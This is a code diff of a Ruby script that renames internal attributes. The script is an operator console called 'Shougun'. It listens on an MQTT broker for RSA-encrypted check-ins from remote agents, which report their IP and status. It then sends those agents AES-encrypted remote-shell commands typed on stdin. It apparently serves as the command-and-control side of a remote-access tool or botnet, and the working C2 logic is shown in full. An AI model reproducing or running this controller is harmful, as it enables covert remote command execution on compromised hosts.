@@ -27,26 +27,26 @@ mqtt_topics = {
 
 shougun = Shougun.new
 
-shougun.bushido[:rsa].config({
+shougun.internals[:rsa].config({
   :key_size => 2048
 })
 
-shougun.bushido[:mqtt].host = 'localhost'
-shougun.bushido[:mqtt].port = 1883
-shougun.bushido[:mqtt].persistent = true
-shougun.bushido[:mqtt].blocking = true
-shougun.bushido[:mqtt].reconnect_limit = 3
-shougun.bushido[:mqtt].reconnect_delay = 60
+shougun.internals[:mqtt].host = 'localhost'
+shougun.internals[:mqtt].port = 1883
+shougun.internals[:mqtt].persistent = true
+shougun.internals[:mqtt].blocking = true
+shougun.internals[:mqtt].reconnect_limit = 3
+shougun.internals[:mqtt].reconnect_delay = 60
 
-shougun.bushido[:mqtt].on_connack do
+shougun.internals[:mqtt].on_connack do
 
 end
 
-shougun.bushido[:mqtt].add_topic_callback(mqtt_topics[:bushi]) do |packet|
+shougun.internals[:mqtt].add_topic_callback(mqtt_topics[:bushi]) do |packet|
   begin
     packet = Base64.decode64(packet.payload)
-    packet = shougun.bushido[:rsa].decrypt(packet)
-    packet = shougun.bushido[:serialization].deserialize(packet)
+    packet = shougun.internals[:rsa].decrypt(packet)
+    packet = shougun.internals[:serialization].deserialize(packet)
 
 		bushi = shougun.bushi.find { |bushi| bushi.id == packet['id'] }
 
@@ -61,7 +61,7 @@ shougun.bushido[:mqtt].add_topic_callback(mqtt_topics[:bushi]) do |packet|
 		bushi.ip = packet['ip']
 		bushi.status = packet['status']
 
-		bushi.bushido[:aes].config({
+		bushi.internals[:aes].config({
 			:key_lenght => 128,
 			:mode => :CTR,
 			:key => packet['aes']['key'],
@@ -72,21 +72,21 @@ shougun.bushido[:mqtt].add_topic_callback(mqtt_topics[:bushi]) do |packet|
   end
 end
 
-shougun.bushido[:mqtt].connect(shougun.bushido[:mqtt].host, shougun.bushido[:mqtt].port, shougun.bushido[:mqtt].keep_alive, shougun.bushido[:mqtt].persistent, shougun.bushido[:mqtt].blocking)
-shougun.bushido[:mqtt].subscribe(["#", 2])
+shougun.internals[:mqtt].connect(shougun.internals[:mqtt].host, shougun.internals[:mqtt].port, shougun.internals[:mqtt].keep_alive, shougun.internals[:mqtt].persistent, shougun.internals[:mqtt].blocking)
+shougun.internals[:mqtt].subscribe(["#", 2])
 
 Thread.new {
 	loop do
-		shougun.bushido[:mqtt].loop_read
-		shougun.bushido[:mqtt].loop_write
+		shougun.internals[:mqtt].loop_read
+		shougun.internals[:mqtt].loop_write
 	end
 }
 
 while command = $stdin.gets.chomp
 	case command
 	when 'pub key'
-		packet = shougun.bushido[:rsa].public_key
-	  shougun.bushido[:mqtt].publish(mqtt_topics[:public_key], packet, true, 2)
+		packet = shougun.internals[:rsa].public_key
+	  shougun.internals[:mqtt].publish(mqtt_topics[:public_key], packet, true, 2)
 	when 'list'
 		shougun.bushi.each do |bushi|
 			puts "#{bushi.id} #{bushi.status}"
@@ -100,9 +100,9 @@ while command = $stdin.gets.chomp
 			:shell => $stdin.gets.chomp
 		}
 		bushi = shougun.bushi.find { |bushi| bushi.id == id }
-		packet = shougun.bushido[:serialization].serialize(packet)
-		packet = bushi.bushido[:aes].encrypt(packet)
-		shougun.bushido[:mqtt].publish(topic, packet, false, 2)
+		packet = shougun.internals[:serialization].serialize(packet)
+		packet = bushi.internals[:aes].encrypt(packet)
+		shougun.internals[:mqtt].publish(topic, packet, false, 2)
 	when 'rs write'
 		topic = mqtt_topics[:remoteshell_write].dup
 		id = $stdin.gets.chomp
@@ -112,8 +112,8 @@ while command = $stdin.gets.chomp
 			:data => $stdin.gets.chomp
 		}
 		bushi = shougun.bushi.find { |bushi| bushi.id == id }
-		packet = shougun.bushido[:serialization].serialize(packet)
-		packet = bushi.bushido[:aes].encrypt(packet)
-		shougun.bushido[:mqtt].publish(topic, packet, false, 2)
+		packet = shougun.internals[:serialization].serialize(packet)
+		packet = bushi.internals[:aes].encrypt(packet)
+		shougun.internals[:mqtt].publish(topic, packet, false, 2)
 	end
 end
